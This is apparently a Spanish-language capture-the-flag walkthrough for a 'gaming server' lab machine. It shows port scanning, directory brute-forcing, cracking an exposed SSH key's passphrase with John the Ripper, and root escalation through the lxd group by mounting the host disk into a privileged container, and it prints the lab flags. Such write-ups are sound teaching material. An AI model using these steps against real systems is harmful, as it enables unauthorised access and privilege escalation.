@@ -1,0 +1,143 @@
+maquina gaming server
+
+puedes acceder a este servidor de juegos contruido por aficionados sin experiencia en desarrollo
+y aprovechar el sistema de despliegue?
+
+comenzamos con nmap
+
+nmap -p- --open -sS -T5 -vvv -n -Pn 10.10.255.66 -oG puertos\n
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+pasamos extractports
+
+22,80
+
+con ip en el navegador encontramos una pagina web sobre el juego, tiene una seccion de archivos
+
+en la parte de uploads obtenemos accesos a archivos interesantes:
+1-un meme
+2-un manifiesto
+3-una lista llamada dict.lst
+
+del manifiesto podemos sacar el nombre The mentor
+
+
+al inpeccionar el codigo de la pagina encontrmos
+" john, please add some actual content to the site! lorem ipsum is horrible to look at. "
+
+por lo que tenemos el primer user john
+
+podemos probar fuzzing
+
+gobuster dir -u http://10.10.255.66/ -w /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 2762]
+/robots.txt           (Status: 200) [Size: 33]
+/secret               (Status: 301) [Size: 313] [--> http://10.10.255.66/secret/]
+/server-status        (Status: 403) [Size: 277]
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.255.66/uploads/]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+
+en /secret encontramos una key RSA
+
+al utlizar
+
+ssh -i secretKey john@ip 
+ nos pide una password para ingresar por lo que utilizamos el scrip en python ssh2john
+
+└─# python3 /usr/share/john/ssh2john.py secretKey > id_rsa.hash
+
+y con este nuevo id_rsa.hash utilizamos la lista para encontrar la password
+
+john --wordlist=lista_dict.txt id_rsa.hash
+#resultado:
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (secretKey)     
+1g 0:00:00:00 DONE (2024-03-14 01:20) 50.00g/s 11100p/s 11100c/s 11100C/s 2003..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+#ahora si nos conectamos por ssh con el usr john
+└─# ssh -i secretKey letmein@10.10.255.66
+ahora si nos conectamos con la id_rsa con el usuario letmein
+nos conectamos como john
+
+al conectar encontramos la primera flag user.txt
+
+a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+
+por medio del comando id encontramos el user/grupo lxd
+
+clonamos este repo con
+
+git clone https://github.com/saghul/lxd-alpine-builder.git
+
+sudo ./build-alpine -a i686\n\n
+
+python3 -m http.server 9090
+
+dentro de la maquina de john importamos la imagen
+lxc image import alpine-v3.19-i686-20240317_1808.tar.gz --alias alpine
+
+obtenemos:
+Image imported with fingerprint: bc5ce207eb29f0fc36e665939663c9ea8785e18b7b1dfeb0e0f29373fd668544
+
+listamos con
+lxc image list 
+
++--------+--------------+--------+-------------------------------+------+--------+------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCH |  SIZE  |         UPLOAD DATE          |
++--------+--------------+--------+-------------------------------+------+--------+------------------------------+
+| alpine | bc5ce207eb29 | no     | alpine v3.19 (20240317_18:08) | i686 | 3.34MB | Mar 20, 2024 at 8:50pm (UTC) |
++--------+--------------+--------+-------------------------------+------+--------+------------------------------+
+
+creamos una maquina desde la imagen
+
+lxc init alpine privesc -c security.privileged=true
+lxc list
++---------+---------+------+------+------------+-----------+
+|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
++---------+---------+------+------+------------+-----------+
+| privesc | STOPPED |      |      | PERSISTENT | 0         |
++---------+---------+------+------+------------+-----------+
+
+le asignamos un disco para montar el host en /mnt/root y de esta forma obtener root
+
+lxc config device add privesc host-root disk source=/ path=/mnt/root
+
+prendemos la maquina con lxc start privesc
+utilizamos
+lxc exec privesc /bin/bash
+
+entramos y somos root
+en /mnt/root podemos ver todo el contenido entramos a root y vemos la flag
+
+~ # cat /mnt/root/root/root.txt 
+2e337b8c9f3aff0c2b3e8d4e6a7c88fc
+
+finalizamos, en la investigacion de lxc/lxd encontre varias opciones de como utilizarlo
+bibliografia lxc/lxd:
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
+https://github.com/initstring/lxd_root
+
+https://medium.com/@wilklins/gamingserver-tryhackme-writeup-16707cbc6c32
+
+https://yebberdog.medium.com/try-hack-me-gaming-server-walkthrough-e85dd5d94aa8
+
+el ultimo fue la metodologia utilizada, la cual es un walkthrough de la maquina
